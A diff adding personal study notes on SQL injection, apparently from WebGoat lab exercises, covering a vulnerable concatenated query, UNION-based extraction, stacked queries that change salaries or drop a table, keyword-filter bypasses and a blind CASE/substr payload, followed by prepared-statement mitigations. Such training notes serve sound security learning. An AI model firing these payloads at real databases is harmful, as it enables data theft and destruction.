@@ -1,0 +1,54 @@
+SQL Injection:
+
+	select department from employees where first_name='Bob';
+
+	update employees set department='Sales';
+
+	alter table employees add phone varchar(20);
+
+	grant alter table to UnauthorizedUser;
+
+SQL injection occurs when a sql query is concatinated with user input
+
+sqlquery = "select * from users where username = '" + userinput + "';
+
+SELECT * From user_data WHERE Login_Count = 1 and userid= 1 Union select userid,null,null,null,null,null,null from user_data--
+
+	use union to retirve data by finding the number of columns
+
+';update employees set salary=100000 where last_name='Smith';-- -
+
+chain queries to update or delete information
+
+	%';drop table access_log;
+
+	update statment to update tom's password
+
+mitigation:
+
+	use prepared statements instead of raw sql queries
+
+Connection conn = DriverManager.getConnection(DBURL,DBUSER,DBPW);
+// connection query
+
+PreparedStatment statement = conn.prepareStatement("SELECT status FROM users WHERE name = ? AND mail = ?");
+//sql statement with placeholder for input
+
+statement.setString(1,"name"); 
+statement.setString(2,"test@test.com");
+// update the inputs
+
+ResultSet result = statement.executeQuery(); 
+// run the SQL query
+
+/**/ is white space in HSQL db
+
+userId = userId.toUpperCase().replace("FROM", "").replace("SELECT", "");
+
+frfromom --> from
+seselectlect --> select
+
+(case+when+(substr((select+ip+from+servers+where+hostname='webgoat-prd'),2,1)=1)+then+hostname+else+ip+end)
+
+prepared statements cant be used in case of oderby or tablename, in those case , you need to whitelist the needed values
+
